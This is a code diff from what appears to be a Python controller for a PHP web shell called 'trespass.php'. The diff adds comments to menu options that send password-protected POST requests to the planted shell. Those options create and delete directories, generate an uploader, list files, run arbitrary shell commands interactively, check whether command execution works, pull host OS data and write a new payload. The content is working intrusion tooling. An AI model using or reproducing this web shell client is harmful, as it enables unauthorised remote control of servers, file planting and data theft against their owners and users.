@@ -75,10 +75,12 @@ while True:
         mkdir=input(" mkdir: ")
         r = requests.post(path, data = { 'pass' : pa55, 'mkdir' : mkdir})
         print(" directory created!")
+    # delete folder
     elif choice == "7":
         rmdir=input(" rmdir: ")
         r = requests.post(path, data = { 'pass' : pa55, 'rmdir' : rmdir})
         print(" directory removed!")
+    # Generate file uploader
     elif choice == "8":
         name=input(" name of file (not including .php): ")
         filename=(name+".php")
@@ -106,10 +108,12 @@ if (md5($pass) == "''' + pa55wd + '''"){
         r = requests.post(path, data = { 'pass' : pa55, 'content' : code, 'filename' : filename })
         print(" file uploader "+filename+" uploaded to the same dir as trespass file!")
         print(" files will be uploaded to your trespass dir /upload")
+    # ls
     elif choice == "9":
         ls=input(" ls: ")
         r = requests.post(path, data = { 'pass' : pa55, 'iwantls' : 'true', 'ls' : ls})
         print(r.text)
+    # run shell commands(check first)
     elif choice == "10":
         print(" type exit to close shell!")
         command=""
@@ -118,15 +122,18 @@ if (md5($pass) == "''' + pa55wd + '''"){
             r = requests.post(path, data = { 'pass' : pa55, 'command' : command})
             print(" "+r.text)
         print(" shell closed!")
+    # check if shell commands can run
     elif choice == "11":
         r = requests.post(path, data = { 'pass' : pa55, 'command' : 'echo this_is_an_obsure_string@*^####---++==='})
         if "this_is_an_obsure_string@*^####---++===" in r.text:
             print(" you can run shell commands!")
         else:
             print(" unconfirmed!")
+    # get OSdata
     elif choice == "12":
         r = requests.post(path, data = { 'pass' : pa55, 'hostdata' : 'get'})
         print(" "+r.text)
+    # create new payload
     elif choice == "13":
         file=open("trespass.php", "w")
         file.write('''<?php
